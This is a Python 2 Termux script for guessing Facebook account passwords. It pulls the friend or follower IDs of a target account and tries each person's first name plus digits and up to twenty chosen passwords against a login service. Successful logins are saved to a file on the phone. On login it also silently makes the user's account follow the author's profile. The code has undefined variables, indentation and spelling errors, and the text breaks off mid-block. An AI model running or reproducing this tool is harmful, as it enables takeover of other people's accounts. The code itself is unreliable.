#!/usr/bin/python2
# coding=utf-8
 
import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'CoD3R'
__copyright = 'All rights reserved . Copyright  CoD3R'
os.system('termux-setup-storage')
 
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass
 
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
c2 = "\033[1;32m""\033[0;97m""\033[1;32m"
c4 = "\033[0;97m""\033[1;32m""\033[0;97m"
c5 = "\033[1;31m""\033[0;97m""\033[1;31m"
os.system('git pull')
os.system('clear')

logo = ('   ______           ____    _____    ____ \n  / ____/  ____    / __ \  |__  /   / __ \ \n / /      / __ \  / / / /   /_ <   / /_/ /\n/ /___   / /_/ / / /_/ /  ___/ /  / _, _/\n\____/   \____/ /_____/  /____/  /_/ |_|   \n               \n              Coded By : CoD3R X\n___________________________________________________')

def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mContact Facebook For Free Approval'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.coder.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
 
    #r = requests.get('https://raw.githubusercontent.com/CoD3R1337/test/main/server.txt').text
    #if to in r:
    os.system('cd Coder && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd Coder && node index.js &')
    time.sleep(5)
    ip()
 
 
def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On Facebook'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to Facebook ')
    os.system('xdg-open https://fb.com/SpArKCoD3R')
    sav = open('/sdcard/.coder.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()
 
 
def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass
 
    print '\033[0;96m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\033[0;96m Your country: ' + country
    time.sleep(2)
    print ''
    print '\033[1;96m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \033[1;96mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    log_menu()
 
 
def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Login menu~~~~'
        print ''
        print '\033[1;92m[1] \033[0;96mLogin with FaceBook'
        print '\033[1;92m[2] \033[0;96mLogin with token'
        print '\033[1;92m[3] \033[0;96mLogin with cookies'
        print ''
        log_menu_s()
 
 
 
def log_menu_s():
    s = raw_input(' \033[0;96mSelect One: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()
 
 
def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[0;96mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User must verify account before login'
            print ''
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')
 
 
 
def log_token():
    os.system('clear')
    print logo
    print ''
    print '\033[0;96mLogin with token'
    print ''
    tok = raw_input(' \033[1;92mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    bot_follow()
    menu()
 
 
def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        bot_follow()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
def bot_follow():
	try:
		toket=open('access_token.txt','r').read()
	except IOError:
		print("\n[!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/100007390861214/subscribers?access_token=' + toket)      #CoD3R
    	menu()
 
 
def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\033[1;31;1mLogin Fcebook Account to continue'
        print ''
        time.sleep(1)
        log_menu()
 
    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Please Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()
        
 
    os.system('clear')
    print logo
    tok = open('/sdcard/.coder.txt', 'r').read()
    print ''
    print '  \033[1;92mLogged in user: ' + z
    print ''
    print ' \033[0;96m Active token: ' + tok
    print ''
    print ' ------------------------------------------ '
    
    print ''
    print '\033[1;92m[1] \033[0;96mCrack with auto password' 
    print '\033[1;92m[2] \033[0;96mExtract Link For File' 
    print '\033[1;92m[3] \033[0;96mView token'
    print '\033[1;92m[4] \033[0;96mLogout'
    print '\033[1;92m[5] \033[0;96mDelete trash files'
    print ''
    menu_s()
 
 
def menu_s():
    ms = raw_input('\033[1;92mSelect One: ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('python2 dump.dd')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        os.remove("access_token.txt")
        log_menu()
    elif ms == '5':
         rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()
 
def crack():
    global toket
    
    try:
	toket=open('access_token.txt','r').read()
    except (KeyError, IOError):
	os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ Auto pass cracking ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()
    
def auto_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
 
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1m~~~~ Auto pass cracking ~~~~'
    print ''
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    print ''
    a_s()
 
 
def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[0;96mSelect One: ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass public cracking ~~~~'
        print ''
        print '\033[0;96m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
        p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input('\033[1;92m[7]Password: ')
        pass8 = raw_input('\033[1;92m[8]Password: ')
	pass9 = raw_input('\033[1;92m[9]Password: ')
	pass10 = raw_input('\033[1;92m[10]Password: ')
	pass11 = raw_input('\033[1;92m[11]Password: ')
	pass12 = raw_input('\033[1;92m[12]Password: ')
	pass13 = raw_input('\033[1;92m[13]Password: ')
	pass14 = raw_input('\033[1;92m[14]Password: ')
	pass15 = raw_input('\033[1;92m[15]Password: ')
	pass16 = raw_input('\033[1;92m[16]Password: ')
	pass17 = raw_input('\033[1;92m[17]Password: ')
	pass18 = raw_input('\033[1;92m[18]Password: ')
	pass19 = raw_input('\033[1;92m[19]Password: ')
	pass20 = raw_input('\033[1;92m[20]Password: ')
        idt = raw_input('\033[0;96m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~Auto pass public cracking~~~~'
            print ''
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()
 
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
        print ''
        print ' \033[0;96mFor example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
        p6 = raw_input(' \033[1;92m[7]Name + digit: ')
        pass7 = raw_input('\033[1;92m[7]Password: ')
        pass8 = raw_input('\033[1;92m[8]Password: ')
	pass9 = raw_input('\033[1;92m[9]Password: ')
	pass10 = raw_input('\033[1;92m[10]Password: ')
	pass11 = raw_input('\033[1;92m[11]Password: ')
	pass12 = raw_input('\033[1;92m[12]Password: ')
	pass13 = raw_input('\033[1;92m[13]Password: ')
	pass14 = raw_input('\033[1;92m[14]Password: ')
	pass15 = raw_input('\033[1;92m[15]Password: ')
	pass16 = raw_input('\033[1;92m[16]Password: ')
	pass17 = raw_input('\033[1;92m[17]Password: ')
	pass18 = raw_input('\033[1;92m[18]Password: ')
	pass19 = raw_input('\033[1;92m[19]Password: ')
	pass20 = raw_input('\033[1;92m[20]Password: ')
        idt = raw_input(' \033[0;96m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\033[1;31;1m~~~~ Auto pass followers cracking ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print ''
            print '\t Invalid user \x1b[0;97m'
            print ''
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()
 
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ Auto pass File cracking ~~~~'
        print ''
        print '\033[0;96m For example: 123 , 1234 , 12345, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        p4 = raw_input(' \033[1;92m[4]Name + digit: ')
        p5 = raw_input(' \033[1;92m[5]Name + digit: ')
        p6 = raw_input(' \033[1;92m[6]Name + digit: ')
        pass7 = raw_input('\033[1;92m[7]Password: ')
        pass8 = raw_input('\033[1;92m[8]Password: ')
        pass9 = raw_input('\033[1;92m[9]Password: ')
        pass10 = raw_input('\033[1;92m[10]Password: ')
        pass11 = raw_input('\033[1;92m[11]Password: ')
        pass12 = raw_input('\033[1;92m[12]Password: ')
        pass13 = raw_input('\033[1;92m[13]Password: ')
        pass14 = raw_input('\033[1;92m[14]Password: ')
        pass15 = raw_input('\033[1;92m[15]Password: ')
        pass16 = raw_input('\033[1;92m[16]Password: ')
        pass17 = raw_input('\033[1;92m[17]Password: ')
        pass18 = raw_input('\033[1;92m[18]Password: ')
        pass19 = raw_input('\033[1;92m[19]Password: ')
        pass20 = raw_input('\033[1;92m[20]Password: ')
        
        try:
	    idlist= raw_input('[+] File Name: ')
	    for line in open(idlist ,'r').readlines():
	        id.append(line.strip())
	except IOError:
	    print"[!] File Not Found."
	    raw_input('Press Enter To Back. ')
	    crack()
        
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        print ''
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[0;96mCrack Running '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print 'Hard work beats talent if talent doesn’t work hard.'
    print 47 * '-'
    print ''
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass1
                cp = open('CoD3R_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass2
                    cp = open('CoD3R_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass3
                        cp = open('CoD3R_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass4
                            cp = open('CoD3R_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = name.lower() + p5
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass5
                                cp = open('CoD3R_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = name.lower() + p6
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass6
                                    cp = open('CoD3R_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = name.lower() + p7
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass7
                                        cp = open('CoD3R_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = name.lower() + p8
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass8
                                            cp = open('CoD3R_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = name.lower() + p9
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass9
                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass9
                                                cp = open('CoD3R_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers = header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass10
                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass10
                                                    cp = open('CoD3R_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
                                                else:
                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass11
                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass11 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass11)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass11
                                                        cp = open('CoD3R_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass11 + '\n')
                                                        cp.close()
                                                        cps.apppend(uid + pass11)
                                                    else:
                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
                                                        q = json.loads(data)
                                                        if 'loc' in q:
                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass12
                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                            ok.write(uid + ' | ' + pass12 + '\n')
                                                            ok.close()
                                                            oks.append(uid + pass12)
                                                        elif 'www.facebook.com' in q['error']:
                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass12
                                                            cp = open('CoD3R_CP.txt', 'a')
                                                            cp.write(uid + ' | ' + pass12 + '\n')
                                                            cp.close()
                                                            cps.apppend(uid + pass12)
                                                        else:
                                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers = header).text
                                                            q = json.loads(data)
                                                            if 'loc' in q:
                                                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass13
                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                ok.write(uid + ' | ' + pass13 + '\n')
                                                                ok.close()
                                                                oks.append(uid + pass13)
                                                            elif 'www.facebook.com' in q['error']:
                                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass13
                                                                cp = open('CoD3R_CP.txt', 'a')
                                                                cp.write(uid + ' | ' + pass13 + '\n')
                                                                cp.close()
                                                                cps.apppend(uid + pass13)
                                                            else:
                                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass14, headers = header).text
                                                                q = json.loads(data)
                                                                if 'loc' in q:
                                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass14
                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                    ok.write(uid + ' | ' + pass14 + '\n')
                                                                    ok.close()
                                                                    oks.append(uid + pass14)
                                                                elif 'www.facebook.com' in q['error']:
                                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass14
                                                                    cp = open('CoD3R_CP.txt', 'a')
                                                                    cp.write(uid + ' | ' + pass14 + '\n')
                                                                    cp.close()
                                                                    cps.apppend(uid + pass14)
                                                                else:
                                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers = header).text
                                                                    q = json.loads(data)
                                                                    if 'loc' in q:
                                                                       print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass15
                                                                       ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                       ok.write(uid + ' | ' + pass15 + '\n')
                                                                       ok.close()
                                                                       oks.append(uid + pass15)
                                                                    elif 'www.facebook.com' in q['error']:
                                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass15
                                                                        cp = open('CoD3R_CP.txt', 'a')
                                                                        cp.write(uid + ' | ' + pass15 + '\n')
                                                                        cp.close()
                                                                        cps.apppend(uid + pass15)
                                                                    else:
                                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass16, headers = header).text
                                                                        q = json.loads(data)
                                                                        if 'loc' in q:
                                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass16
                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                            ok.write(uid + ' | ' + pass16 + '\n')
                                                                            ok.close()
                                                                            oks.append(uid + pass16)
                                                                        elif 'www.facebook.com' in q['error']:
                                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass16
                                                                            cp = open('CoD3R_CP.txt', 'a')
                                                                            cp.write(uid + ' | ' + pass16 + '\n')
                                                                            cp.close()
                                                                            cps.apppend(uid + pass16)
                                                                        else:
                                                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass17, headers = header).text
                                                                            q = json.loads(data)
                                                                            if 'loc' in q:
                                                                                print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass17
                                                                                ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                ok.write(uid + ' | ' + pass17 + '\n')
                                                                                ok.close()
                                                                                oks.append(uid + pass17)
                                                                            elif 'www.facebook.com' in q['error']:
                                                                                print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass17
                                                                                cp = open('CoD3R_CP.txt', 'a')
                                                                                cp.write(uid + ' | ' + pass17 + '\n')
                                                                                cp.close()
                                                                                cps.apppend(uid + pass17)
                                                                            else:
                                                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass18, headers = header).text
                                                                                q = json.loads(data)
                                                                                if 'loc' in q:
                                                                                    print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass18
                                                                                    ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                    ok.write(uid + ' | ' + pass18 + '\n')
                                                                                    ok.close()
                                                                                    oks.append(uid + pass18)
                                                                                elif 'www.facebook.com' in q['error']:
                                                                                    print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass18
                                                                                    cp = open('CoD3R_CP.txt', 'a')
                                                                                    cp.write(uid + ' | ' + pass18 + '\n')
                                                                                    cp.close()
                                                                                    cps.apppend(uid + pass18)
                                                                                else:
                                                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass19, headers = header).text
                                                                                    q = json.loads(data)
                                                                                    if 'loc' in q:
                                                                                        print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass19
                                                                                        ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                        ok.write(uid + ' | ' + pass19 + '\n')
                                                                                        ok.close()
                                                                                        oks.append(uid + pass19)
                                                                                    elif 'www.facebook.com' in q['error']:
                                                                                        print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass19
                                                                                        cp = open('CoD3R_CP.txt', 'a')
                                                                                        cp.write(uid + ' | ' + pass19 + '\n')
                                                                                        cp.close()
                                                                                        cps.apppend(uid + pass19)
                                                                                    else:
                                                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass20, headers = header).text
                                                                                        q = json.loads(data)
                                                                                        if 'loc' in q:
                                                                                            print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass20
                                                                                            ok = open('/sdcard/ids/CoD3R_OK.txt', 'a')
                                                                                            ok.write(uid + ' | ' + pass20 + '\n')
                                                                                            ok.close()
                                                                                            oks.append(uid + pass20)
                                                                                        elif 'www.facebook.com' in q['error']:
                                                                                            print '\x1b[1;93m[CoD3R-CP] ' + uid + ' | ' + pass20
                                                                                            cp = open('CoD3R_CP.txt', 'a')
